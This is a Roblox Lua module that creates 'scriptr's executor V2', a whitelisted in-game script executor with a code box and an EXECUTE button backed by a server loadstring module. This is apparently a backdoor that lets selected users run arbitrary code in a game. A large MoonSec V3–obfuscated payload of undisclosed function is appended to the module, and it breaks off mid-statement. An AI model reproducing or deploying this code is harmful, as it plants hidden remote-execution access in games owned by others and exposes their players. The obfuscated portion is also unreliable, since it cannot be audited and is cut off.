local module = {}

module.loaded = false
module.whitelist = nil

module.getcoredata = function(whitelist)
	module.whitelist = whitelist

	if module.whitelist then
		module.loaded = true
	end
end

local loadstring = require(game:GetService("ReplicatedStorage").loadstring)

function module:createGUI(player)
	if module.loaded == false and module.whitelist == nil and player:FindFirstChild("PlayerGui"):FindFirstChild("exec") then
	else
		if table.find(module.whitelist, player.UserId) then
			exec = Instance.new("ScreenGui")
			execute2 = Instance.new("RemoteEvent")
			main = Instance.new("Frame")
			UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
			title = Instance.new("TextLabel")
			buttons = Instance.new("Frame")
			execute = Instance.new("TextButton")
			UICorner = Instance.new("UICorner")
			shadow = Instance.new("Frame")
			UICorner_2 = Instance.new("UICorner")
			UITextSizeConstraint = Instance.new("UITextSizeConstraint")
			UIGridLayout = Instance.new("UIGridLayout")
			clear = Instance.new("TextButton")
			UICorner_3 = Instance.new("UICorner")
			shadow_2 = Instance.new("Frame")
			UICorner_4 = Instance.new("UICorner")
			UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
			scriptlist = Instance.new("TextButton")
			UICorner_5 = Instance.new("UICorner")
			shadow_3 = Instance.new("Frame")
			UICorner_6 = Instance.new("UICorner")
			UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
			settingz = Instance.new("TextButton")
			UICorner_7 = Instance.new("UICorner")
			shadow_4 = Instance.new("Frame")
			UICorner_8 = Instance.new("UICorner")
			UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
			exec_2 = Instance.new("Frame")
			scripteditor = Instance.new("ScrollingFrame")
			scriptbox = Instance.new("TextBox")
			otherscripts = Instance.new("Frame")
			TextLabel = Instance.new("TextLabel")
			settings_2 = Instance.new("Frame")
			TextLabel_2 = Instance.new("TextLabel")

			exec.Name = "exec"
			exec.Enabled = true
			exec.ResetOnSpawn = false
			exec.IgnoreGuiInset = true
			exec.Parent = player:FindFirstChild("PlayerGui")

			execute2.Name = "execute"
			execute2.Parent = exec

			main.Name = "main"
			main.Parent = exec
			main.AnchorPoint = Vector2.new(0.5, 0.5)
			main.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
			main.BorderColor3 = Color3.fromRGB(0, 0, 0)
			main.BorderSizePixel = 0
			main.Position = UDim2.new(0.5, 0, 0.5, 0)
			main.Size = UDim2.new(0.5, 0, 0.400000006, 0)

			UIAspectRatioConstraint.Parent = main
			UIAspectRatioConstraint.AspectRatio = 2.042

			title.Name = "title"
			title.Parent = main
			title.AnchorPoint = Vector2.new(0.5, 0.5)
			title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			title.BorderSizePixel = 0
			title.Position = UDim2.new(0.5, 0, 0.0500000007, 0)
			title.Size = UDim2.new(1, 0, 0.100000009, 0)
			title.Font = Enum.Font.SourceSansBold
			title.RichText = true
			title.Text = "scriptr's executor<font color = \"rgb(0,200,0)\"><font size = \"5\">V2</font></font>"
			title.TextColor3 = Color3.fromRGB(255, 255, 255)
			title.TextScaled = true
			title.TextSize = 14.000
			title.TextWrapped = true
			title.TextXAlignment = Enum.TextXAlignment.Left

			buttons.Name = "buttons"
			buttons.Parent = main
			buttons.AnchorPoint = Vector2.new(0.5, 0.5)
			buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			buttons.BackgroundTransparency = 1.000
			buttons.BorderColor3 = Color3.fromRGB(0, 0, 0)
			buttons.BorderSizePixel = 0
			buttons.Position = UDim2.new(0.5, 0, 0.899999976, 0)
			buttons.Size = UDim2.new(0.95, 0, 0.18, 0)

			execute.Name = "execute"
			execute.Parent = buttons
			execute.AnchorPoint = Vector2.new(0.5, 0.5)
			execute.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
			execute.BorderSizePixel = 0
			execute.Size = UDim2.new(0.244, 0, 1, 0)
			execute.ZIndex = 2
			execute.Font = Enum.Font.SourceSansSemibold
			execute.Text = "EXECUTE"
			execute.TextColor3 = Color3.fromRGB(255, 255, 255)
			execute.TextScaled = true
			execute.TextSize = 36.000
			execute.TextWrapped = true

			UICorner.Parent = execute

			shadow.Name = "shadow"
			shadow.Parent = execute
			shadow.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow.BorderSizePixel = 0
			shadow.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow.Size = UDim2.new(1, 0, 1, 0)

			UICorner_2.Parent = shadow

			UITextSizeConstraint.Parent = execute
			UITextSizeConstraint.MaxTextSize = 36

			UIGridLayout.Parent = buttons
			UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			UIGridLayout.CellSize = UDim2.new(0.244, 0, 1, 0)
			UIGridLayout.CellPadding = UDim2.new(0.008, 0, 0, 0)

			clear.Name = "clear"
			clear.Parent = buttons
			clear.AnchorPoint = Vector2.new(0.5, 0.5)
			clear.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
			clear.BorderSizePixel = 0
			clear.Size = UDim2.new(0.244, 0, 1, 0)
			clear.ZIndex = 2
			clear.Font = Enum.Font.SourceSansSemibold
			clear.Text = "CLEAR"
			clear.TextColor3 = Color3.fromRGB(255, 255, 255)
			clear.TextScaled = true
			clear.TextSize = 36.000
			clear.TextWrapped = true

			UICorner_3.Parent = clear

			shadow_2.Name = "shadow"
			shadow_2.Parent = clear
			shadow_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_2.BorderSizePixel = 0
			shadow_2.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_2.Size = UDim2.new(1, 0, 1, 0)

			UICorner_4.Parent = shadow_2

			UITextSizeConstraint_2.Parent = clear
			UITextSizeConstraint_2.MaxTextSize = 36

			scriptlist.Name = "scriptlist"
			scriptlist.Parent = buttons
			scriptlist.AnchorPoint = Vector2.new(0.5, 0.5)
			scriptlist.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			scriptlist.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scriptlist.BorderSizePixel = 0
			scriptlist.Size = UDim2.new(0.244, 0, 1, 0)
			scriptlist.ZIndex = 2
			scriptlist.Font = Enum.Font.SourceSansSemibold
			scriptlist.Text = "OTHER SCRIPTS"
			scriptlist.TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptlist.TextScaled = true
			scriptlist.TextSize = 20.000
			scriptlist.TextWrapped = true

			UICorner_5.Parent = scriptlist

			shadow_3.Name = "shadow"
			shadow_3.Parent = scriptlist
			shadow_3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_3.BorderSizePixel = 0
			shadow_3.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_3.Size = UDim2.new(1, 0, 1, 0)

			UICorner_6.Parent = shadow_3

			UITextSizeConstraint_3.Parent = scriptlist
			UITextSizeConstraint_3.MaxTextSize = 20

			settingz.Name = "settings"
			settingz.Parent = buttons
			settingz.AnchorPoint = Vector2.new(0.5, 0.5)
			settingz.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			settingz.BorderColor3 = Color3.fromRGB(0, 0, 0)
			settingz.BorderSizePixel = 0
			settingz.Size = UDim2.new(0.244, 0, 1, 0)
			settingz.ZIndex = 2
			settingz.Font = Enum.Font.SourceSansSemibold
			settingz.Text = "SETTINGS"
			settingz.TextColor3 = Color3.fromRGB(255, 255, 255)
			settingz.TextScaled = true
			settingz.TextSize = 36.000
			settingz.TextWrapped = true

			UICorner_7.Parent = settingz

			shadow_4.Name = "shadow"
			shadow_4.Parent = settingz
			shadow_4.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_4.BorderSizePixel = 0
			shadow_4.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_4.Size = UDim2.new(1, 0, 1, 0)

			UICorner_8.Parent = shadow_4

			UITextSizeConstraint_4.Parent = settingz
			UITextSizeConstraint_4.MaxTextSize = 36

			exec_2.Name = "exec"
			exec_2.Parent = main
			exec_2.AnchorPoint = Vector2.new(0.5, 0.5)
			exec_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			exec_2.BackgroundTransparency = 1.000
			exec_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			exec_2.BorderSizePixel = 0
			exec_2.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			exec_2.Size = UDim2.new(1, 0, 0.699999988, 0)

			scripteditor.Name = "scripteditor"
			scripteditor.Parent = exec_2
			scripteditor.Active = true
			scripteditor.AnchorPoint = Vector2.new(0.5, 0.5)
			scripteditor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			scripteditor.BackgroundTransparency = 1.000
			scripteditor.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scripteditor.BorderSizePixel = 0
			scripteditor.Position = UDim2.new(0.5, 0, 0.5, 0)
			scripteditor.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
			scripteditor.CanvasSize = UDim2.new(0, 0, 0.600000024, 0)
			scripteditor.ScrollBarThickness = 0

			scriptbox.Name = "scriptbox"
			scriptbox.Parent = scripteditor
			scriptbox.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
			scriptbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scriptbox.BorderSizePixel = 0
			scriptbox.Size = UDim2.new(1, 0, 1, 0)
			scriptbox.ClearTextOnFocus = false
			scriptbox.Font = Enum.Font.SourceSans
			scriptbox.MultiLine = true
			scriptbox.Text = ""
			scriptbox.TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptbox.TextSize = 20.000
			scriptbox.TextXAlignment = Enum.TextXAlignment.Left
			scriptbox.TextYAlignment = Enum.TextYAlignment.Top

			otherscripts.Name = "otherscripts"
			otherscripts.Parent = main
			otherscripts.AnchorPoint = Vector2.new(0.5, 0.5)
			otherscripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			otherscripts.BackgroundTransparency = 1.000
			otherscripts.BorderColor3 = Color3.fromRGB(0, 0, 0)
			otherscripts.BorderSizePixel = 0
			otherscripts.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			otherscripts.Size = UDim2.new(1, 0, 0.699999988, 0)
			otherscripts.Visible = false

			TextLabel.Parent = otherscripts
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Size = UDim2.new(1, 0, 1, 0)
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.Text = "data."
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextWrapped = true

			settings_2.Name = "settings"
			settings_2.Parent = main
			settings_2.AnchorPoint = Vector2.new(0.5, 0.5)
			settings_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			settings_2.BackgroundTransparency = 1.000
			settings_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			settings_2.BorderSizePixel = 0
			settings_2.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			settings_2.Size = UDim2.new(1, 0, 0.699999988, 0)
			settings_2.Visible = false

			TextLabel_2.Parent = settings_2
			TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel_2.BackgroundTransparency = 1.000
			TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel_2.BorderSizePixel = 0
			TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
			TextLabel_2.Font = Enum.Font.SourceSans
			TextLabel_2.Text = "MASSIVE WIP"
			TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
			TextLabel_2.TextScaled = true
			TextLabel_2.TextSize = 14.000
			TextLabel_2.TextWrapped = true
		end
	end
end

([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _IACWMAuekAKc = a; end)); do return(function(f,...)local t;local d;local _;local l;local a;local c;local e=24915;local n=0;local r={};while n<971 do n=n+1;while n<0x2e6 and e%0x16ca<0xb65 do n=n+1 e=(e+1009)%14854 local o=n+e if(e%0x267a)>=0x133d then e=(e*0x23d)%0xaef5 while n<0x28b and e%0xd66<0x6b3 do n=n+1 e=(e-863)%19408 local t=n+e if(e%0x1ee2)<0xf71 then e=(e*0x1da)%0x85ff local e=22781 if not r[e]then r[e]=0x1 l=string;end elseif e%2~=0 then e=(e-0x11f)%0x9b20 local e=94740 if not r[e]then r[e]=0x1 c=tonumber;end else e=(e-0x2e4)%0x4bdf n=n+1 local e=73578 if not r[e]then r[e]=0x1 d=(not d)and _ENV or d;end end end elseif e%2~=0 then e=(e-0x8a)%0xad0e while n<0x126 and e%0xf92<0x7c9 do n=n+1 e=(e+690)%16113 local o=n+e if(e%0x1ba6)<=0xdd3 then e=(e*0x2d1)%0x7cb0 local e=94157 if not r[e]then r[e]=0x1 a="\4\8\116\111\110\117\109\98\101\114\98\104\108\122\100\100\103\84\0\6\115\116\114\105\110\103\4\99\104\97\114\83\99\87\85\102\100\111\84\0\6\115\116\114\105\110\103\3\115\117\98\104\79\107\66\121\114\97\87\0\6\115\116\114\105\110\103\4\98\121\116\101\70\85\98\67\120\70\81\97\0\5\116\97\98\108\101\6\99\111\110\99\97\116\105\86\66\88\107\117\119\104\0\5\116\97\98\108\101\6\105\110\115\101\114\116\106\90\72\88\98\99\79\121\5";end elseif e%2~=0 then e=(e+0x328)%0x8e74 local e=37032 if not r[e]then r[e]=0x1 t=function(t)local e=0x01 local function r(n)e=e+n return t:sub(e-n,e-0x01)end while true do local n=r(0x01)if(n=="\5")then break end local e=l.byte(r(0x01))local e=r(e)if n=="\2"then e=_.bhlzddgT(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then d[e]=function(n,e)return f(8,nil,f,e,n)end elseif n=="\4"then e=d[e]elseif n=="\0"then e=d[e][r(l.byte(r(0x01)))];end local n=r(0x08)_[n]=e end end end else e=(e-0x3e9)%0xbab9 n=n+1 local e=22802 if not r[e]then r[e]=0x1 end end end else e=(e-0x75)%0x229c n=n+1 while n<0x123 and e%0x1254<0x92a do n=n+1 e=(e*260)%28284 local t=n+e if(e%0x3c18)<=0x1e0c then e=(e*0x295)%0x757b local e=57733 if not r[e]then r[e]=0x1 _={};end elseif e%2~=0 then e=(e*0x268)%0x31ad local e=13740 if not r[e]then r[e]=0x1 end else e=(e+0x16)%0x5735 n=n+1 local e=87142 if not r[e]then r[e]=0x1 d=getfenv and getfenv();end end end end end e=(e+886)%36529 end t(a);local e={};for n=0x0,0xff do local r=_.ScWUfdoT(n);e[n]=r;e[r]=n;end local function o(n)return e[n];end local a=(function(f,l)local a,r=0x01,0x10 local n={{},{},{}}local d=-0x01 local e=0x01 local t=f while true do n[0x03][_.hOkByraW(l,e,(function()e=a+e return e-0x01 end)())]=(function()d=d+0x01 return d end)()if d==(0x0f)then d=""r=0x000 break end end local d=#l while e<d+0x01 do n[0x02][r]=_.hOkByraW(l,e,(function()e=a+e return e-0x01 end)())r=r+0x01 if r%0x02==0x00 then r=0x00 _.jZHXbcOy(n[0x01],(o((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+t)%0x100)));t=f+t;end end return _.iVBXkuwh(n[0x01])end);t(a(160,"4K.0ku}6-QR9z2EH}u"));t(a(164,"RzM^0*K4t5,PQ)if*QPit4i0^i5zfM040nfQK5P)zQ4^Ptz.t^i5zt,^)iiQ05zc*fP5M94QQizf4*fM^)56ix^P0),)40)MM*tKit0t40f^Mt,zi*KQP)PozM)P^t5Mi*0K5P5**5,5ztK^Q0zMtzQzMP50i)^^,,5tftP)L)4QQQQ*tt)Q^5,tfQ*tP*I^4*QtMyKK)iQQ^Xf^0z,QDz**QZI54tQzzit0)5ztt0i)0P5KfP^,,5P0z^PiM5t^fn04,KQ^*fPQzzK,,>M,t0)4)/MQfP0z,*TQ0QP5J}tN,5Mf5KQ^)K^zQ*KM54#t*PQ)e0*f)5QQMQf00P,PntKMP*zKKP,zM4KMP,^ztf)i0i0!,zKQP*zM4tQ)Q,5*i,0t5*f^*4Piz,K))Kfft)i4^PMQt,**,,2t**P^z4K,,,z4K)ii^*t,fQiQ05z_KiQzMMt0QK^EtPiiM),M9QKz*F,i44Q*Mt4))400,0fQ^^t,a50zPfvfYQKQ^ztzfu0{^5fK*tP4z^4MPMf5KzPMMK,Mft^50z"));local e=(-14466+(function()local d,n=0,1;(function(r,n,e,d)e(n(e,r,e,d),r(d and r,e,r,r),n(d,e,n and e,n and n),n(n and e,r,n,n)and r(e,d,e,e and d))end)(function(e,t,l,r)if d>115 then return e end d=d+1 n=(n-418)%14149 if(n%1262)>=631 then n=(n-920)%24636 return e else return e(t(e,r,e,l),l(e,e,l,e and e),t(t,t,r and e,r),e(e,t,r,e))end return r(l(r,t,l,r),t(l,t,e,e),r(e,e,r,l),e(r,e,e,t))end,function(t,l,e,r)if d>238 then return e end d=d+1 n=(n-221)%43429 if(n%220)>=110 then n=(n+52)%34104 return t else return r(l(r,r and e,e,e),t(e,r,r,e)and e(t and e,l,e,r),r(t,r,e,t and t),r(l and e,r,t,r)and e(t,t and t,l,r))end return e(r(t,e and l,r,e),e(e,e,r,r and r),r(r,e,r,e and l),e(l,e,e and e,l and l))end,function(e,l,r,t)if d>414 then return r end d=d+1 n=(n*804)%25140 if(n%676)>=338 then n=(n*321)%12585 return t(e(r,t,e,e),l(r,e,r,t),t(t,e,l,r),r(l,e,l,t))else return e end return r end,function(e,l,r,t)if d>228 then return r end d=d+1 n=(n+302)%1094 if(n%652)<=326 then n=(n+124)%36879 return r else return e(r(e,r,e,e and t),e(l,e,e,r),t(l and r,e,t,t),r(e,t,l,r))end return r(e(t,t,e,e),e(r,e,r,e and e),t(l,t,t,l and r)and e(r,e and r,t,e),e(r,r,e,e))end)return n;end)())local re=(getfenv)or(function()return _ENV end);local h=_.bFWQvaZp or _.vvmzGywo;local t=3;local ne=1;local d=2;local o=4;local function y(b,...)local s=a(e,"j#_VZMT&EW=Yr/IaI&rZ=TEET/MV_I#pa_VY#adI/arVYVEWOMa/rT=EE=YWY/WaE:Z&VY#YaWra/_Y_EY&_Z/VYa_aM/_YZW&E_V&Zr_IkIE#TTZ__Z;TMMVW#vLV/rY&V&_VaE/=Yra/rW=VE&&/MM_YZ##VaYYVWaWW#Y_#/rYI=i/Trr=aWY_=M_V&#ra&WZr/WWE/#rZIV_##aErY=YWI&#M_a6_Wa/I=r%M=TWT/ZaVNa&IYrYT=E_Z#aA/VYZWT&E&IVr#I:7IMrE=TEET=YWEa&WT>/&rpWE&=Mr==EaTVZEVW#rar/MYrW&#Ma=/TYEW=I#/T=MEMTV#ErYYTErTIM8=M&&TEZ#_=#1IVrZ=YWE&MM=r/Y#EI&4M_W&E_M/VY_I=#E=T_ZZ_TZIMVVI#V/V/IY/WYETTI/arM=.E_TZ=EW/&ITdV/#IfM&&T#VE#=arV__M#=aEY_=WEr&#M=_aIZW&&=MEV=#rTMZ#_a%WEWTIZ=_rpIZMZM#WUEr#YIVa_aBkI_rZaEI//=YEW&&VMVZE#Yarr//B=/W_TVZY_Y=YEITrZIV8&YT_Va_rW/rWMIZQ__TrM=Vr#=aa=E&aT#ETM&ZaIEDVI&/Z==WWTEM/V/##82/Vr#=_E=M/ZEVlrrIV/#Y#MMMm_a#EaW/rr&WM&/MI_/irwYIW/GYWW=T/M/VY#ZaZ/VrEW&TWZr_a#Ta#/#Irra&&W&T/M&VII#5&=ZrZ=a&/y#IWr_=ZETrYYrW#TaTZV&aYIYr#M/ZT#I+HI_zYQYarY/Y#=OETMYV&#YWYETMrVI_z&#ME_Ib/ar/aY#=_&YTZZ=_YW/EZMIZu__ZYZYVrIYaaI&YIWM#&a//EY=WrIV/E=&E&&YMr_a=aW&&3M_VZE/TGZVVl8VIrrYY&W=,Ya_rr=IWeIMYW==ErTVZ=_M#=EMTIZT_E<=MaVV_Z1T//rZWaE/MY#NrV==EZTTZEEaEZMVVV_&CE/YE=V/__aII+r_##aMrrYaWE&VaV/YYZWT&E=I=#WT&Z_I_MpEI//TZaV_#8a_/Z#Y#-/aYaZ#_Y7_IZrTaHaIIqYIEV&&TTZr_#a/I#T#ZI__GZITFI#Va=/_WTWYETTWZra/XZI&rr=T_&F/IEr==r/_/MrM=EEET&MVYa=&EAT_ZZ&T&ZZYZM#V7_YWrWWa#YUZ/rYI=.aMr&YEW#&=T*V=#WqMIEMWZ##=ar/IVV?MaTraYEWITIM/ZEYMWW&TMEV=W,MaZ__IgWEW&_Z=_r?IMWZ9#/p=/YrT=MEVTIMTr&=YEET=Zr=_&WTTZ5#YWY&IMrVI_ATEZ/VZUrE/&_ZIVy#_T&VI#WaIIY/MZ___OZITrE##ErTIMeM_Z=aT/=Y=W/&I&YZ_VT_VIErI=r=Y&*M_VZ#TaW/=YIWIEZT_ZT_T_EarrrYdWn&ZMZM##EUrITYI=ZE_&/ZT_En=Ir/=Y(WZ&ZM=VE#rarIZ/T=_ETTTM#_=(/II/5Y_WEWTMEV=#r.&IRrV=ZE=EEZ=_r^IVa/_YMWTE=ETVr_g>?!_rZ=TEEE=Mr_I#_a_/TYTYY&=TIM#_JsMIZ//=EE=TrTIZM#_a&/TYYW=EaMITUVY!ZI=rE=YEr&EMeV_#raT/=Y==6&IT_Z__=1WIErr=r//&eMVVZ#TaE/I/rWIE4T_WV_TcWI=/I/=W:&ZMZZ/#Ea=/r/IY=E_TTZT_=S=a=rIY WE&ZM=VE#Yar/Ir3=_WYTTZ=_=#wII/_Y_=TEJMEV/#rxFIbr_=ZWEE_Z=V^gIaW/_YZWTWE&wVr__qDITrZYMEE&rM#_I#Ta_IIYTWE&=MrMM_X8TIZrr=EErTrTIZr#_aE/TYrW=E/MIM_V/^ZIrrEY&ErTIMyV__=aT/aY=W/&ITiZ__Z_VIErI=rWM&eM_VZ#Tar/=YaWIE T_ZT_T)Ea&rrY#Wz&VMZVE#E#=I=YI=ZE_T&ZTVZU=aI/=YQWE&ZTaVE#=arak/Y=_EYTTMI_=0rIII_r&WZ&IMEVY#raIIn/ZY_ET&#Z=ZIfIa5/_rT==&ETZVr_M)eI_rZYEEIT=M&_I__a_/ZYT==W#MrZ=_z_TIZrT=EWr&EZIV/#_aW/TYEW=EI&ZZ7VRwZ(ZrE==ErE1T=V__VaTIrY=Wr&I&_ZM_Z#TIEr/=rEI&^TZZE#T>W/=rzWIECT_MT_YmEarrrr/W;&_MZZEVba=IaYIYvE_TZZTV=VTIrI_Yy==&ZMTVE_r_E/I/M=_WWTTZE_=#I#=/*rEWZ&IMEV=#raIIIr_=EET&IZ=_/5I4_IaYZW=&ETVVr#Ih(._I#=TErT=M{_I#aa_ITrIWEEcMrZW_8p_IZrTY&E=&QZIVT#_aT/T/E=Z&rT_ZK_T}ZJ#rEYrW.TIMTV_VMaT/EY=WrWMTlZT_ZdrIErr=r=IEaM_VE#Tar/=r_WIE,&TZZ_r9EIYrr=IW+EZMIVT#aa=aMYI=3E_&TMV_E#_IrIZY9W_&ZTEZI#=UM/Ir#=_EZTTM=VakraE/?/ZWZ&TMEZrVMaIIYr_=YETTEZ=VI#=ab/IYZ=E&EM=VrVf+VI_/#=T=rT=Zr_I__a=/ZrZWE&aMrVI_l#ZaTrTY&E=E=ZIVd#_cT//YE==&r&_Z4__4ZaEIZ==W/TIMVV_#ZaTI=rVWrW5T9ZT_ZsTIE/r/EEIEVM_MV#TaE/=rIr=El&TZZVT^EI=rrr1YI&_TWVTVoa=/rYIY_W&TZMr_E#aIrrIYR=ZW#MTZa#=XZ/Irs=_EZ&#ZE_I>rfM/nYVWZ&=T=V=#raIZTr_=METEE&&_r#{ah/VYZY#&ETrTr#IbZI_I#=TEET=ZrVM#caZ/ZY=WE&rMrMI_E8_ITrT==E=E&ZIZ_#VaZ/=YEYV&rMIZ1__##ITr===WhTIM_V_#=FI/EYrWrIZTwZV_ZNTIErIrrEI&LM_W=#TaW/=rIr=E!TZZZZTKEI=rrrIYV&_MTVT#=a=aaYIY_EVTZZW_E_#IrrIYsY_ETMTVY#=aa/I/V=_=Z&TZE_IJrIa/7YrWZ&TTaV=#IaIIZr_=TETTIZY_r#8a^V_YZW&&EMYVr___*I_rZ=TIET=Z/_I#Z#_/ZYTWEIcMrVa_U__I&rT==E=T/ZIZ/#_#ZaaYEWr&rT+ZnV/LZaEIZ==W0TITWV_#ZaT/EYIWrEJT<ZT_Z}EIEI==IEI&_M_VT#T#Z/=Yr=ZEkTZZZ_EsEIYrr=I=V&_MZVT#Wa=/rYI==E_TZZT_E#ZIrrIY!WV&ZMTVE_rG:/Irk=_ETTTZE_=#IPM/1Y_WZ&=MEV=#r_ZaVr_=ZETTIZ=_/fIaM/_YEYT&EM=Vr_Z}uIVrZ=TWYT=Zr_I##a_/ZYT===TMrVI_z!MIZrT=EErT/ZIV##_aZ/TYEW=ErEaZv__<ZI&rE=YErTIM#V_#ZaT/WY=Wr&I");local n=0;_.bWQraXLK(function()_.XiTxEozK()n=n+1 end)local function e(e,r)if r then return n end;n=e+n;end local r,n,a=f(0,f,e,s,_.FUbCxFQa);local function l()local n,r=_.FUbCxFQa(s,e(1,3),e(5,6)+2);e(2);return(r*256)+n;end;local u=true;local u=0 local function p()local d=n();local e=n();local t=1;local d=(r(e,1,20)*(2^32))+d;local n=r(e,21,31);local e=((-1)^r(e,32));if(n==0)then if(d==u)then return e*0;else n=1;t=0;end;elseif(n==2047)then return(d==0)and(e*(1/0))or(e*(0/0));end;return _.pqcyplVr(e,n-1023)*(t+(d/(2^52)));end;local k=n;local function z(n)local r;if(not n)then n=k();if(n==0)then return'';end;end;r=_.hOkByraW(s,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+u),#r do e=e.._.hOkByraW(r,n,n)end return e;end;local u=#_.AkJFacVj(c('\49.\48'))~=1 local e=n;local function j(...)return{...},_.xtOJmIk_('#',...)end local function y()local h={};local e={};local c={};local s={c,h,nil,e};local e=n()local f={}for d=1,e do local r=a();local n;if(r==2)then n=(a()~=#{});elseif(r==1)then local e=p();if u and _.ZmQ_liSn(_.AkJFacVj(e),'.(\48+)$')then e=_.VAMBZztY(e);end n=e;elseif(r==3)then n=z();end;f[d]=n;end;s[3]=a();for e=1,n()do h[e-(#{1})]=y();end;for _=1,n()do local e=a();if(r(e,1,1)==0)then local a=r(e,2,3);local h=r(e,4,6);local e={l(),l(),nil,nil};if(a==0)then e[t]=l();e[o]=l();elseif(a==#{1})then e[t]=n();elseif(a==b[2])then e[t]=n()-(2^16)elseif(a==b[3])then e[t]=n()-(2^16)e[o]=l();end;if(r(h,1,1)==1)then e[d]=f[e[d]]end if(r(h,2,2)==1)then e[t]=f[e[t]]end if(r(h,3,3)==1)then e[o]=f[e[o]]end c[_]=e;end end;return s;end;local function g(r,e,n)local d=e;local d=n;return c(_.ZmQ_liSn(_.ZmQ_liSn(({_.bWQraXLK(r)})[2],e),n))end local function p(k,e,a)local function ee(...)local l,m,u,ee,c,n,s,y,z,b,g,r;local e=0;while-1<e do if 3>e then if e>0 then if 1==e then u=f(6,99,3,13,k);c=j ee=0;else n=-41;s=-1;end else l=f(6,51,1,99,k);m=f(6,62,2,85,k);end else if 5>e then if 2<e then repeat if 4>e then y={};z={...};break;end;b=_.xtOJmIk_('#',...)-1;g={};until true;else b=_.xtOJmIk_('#',...)-1;g={};end else if 4<=e then for n=30,97 do if e<6 then r=f(7);break;end;e=-2;break;end;else e=-2;end end end e=e+1;end;for e=0,b do if(e>=u)then y[e-u]=z[e+1];else r[e]=z[e+1];end;end;local e=b-u+1 local e;local f;local function _(...)while true do end end while true do if n<-40 then n=n+42 end e=l[n];f=e[ne];if 27<=f then if f<=40 then if f>=34 then if 36>=f then if f<35 then local n=e[d]local d,e=c(r[n](h(r,n+1,e[t])))s=e+n-1 local e=0;for n=n,s do e=e+1;r[n]=d[e];end;else if f>35 then local d=e[d];local n=r[e[t]];r[d+1]=n;r[d]=n[e[o]];else local f;for _=0,5 do if _<3 then if 0>=_ then r[e[d]]=r[e[t]][e[o]];n=n+1;e=l[n];else if 2==_ then r[e[d]]=r[e[t]][e[o]];n=n+1;e=l[n];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end else if _>3 then if _~=3 then for a=31,90 do if _~=4 then if not r[e[d]]then n=n+1;else n=e[t];end;break;end;f=e[d]r[f]=r[f](h(r,f+1,e[t]))n=n+1;e=l[n];break;end;else f=e[d]r[f]=r[f](h(r,f+1,e[t]))n=n+1;e=l[n];end else r[e[d]]=r[e[t]][e[o]];n=n+1;e=l[n];end end end end end else if 39<=f then if f==40 then if r[e[d]]then n=n+1;else n=e[t];end;else local n=e[d]local d,e=c(r[n](h(r,n+1,e[t])))s=e+n-1 local e=0;for n=n,s do e=e+1;r[n]=d[e];end;end else if 38==f then if(r[e[d]]~=e[o])then n=n+1;else n=e[t];end;else local l,o,f,h,a,_;local n=0;while n>-1 do if 3<n then if n>5 then if 5<=n then for e=25,61 do if n~=7 then r[_]=a;break;end;n=-2;break;end;else n=-2;end else if n>3 then for e=23,96 do if n<5 then a=h[l[f]];break;end;_=l[o];break;end;else a=h[l[f]];end end else if n<=1 then if-1~=n then repeat if 1~=n then l=e;break;end;o=d;until true;else o=d;end else if 3>n then f=t;else h=r;end end end n=n+1 end 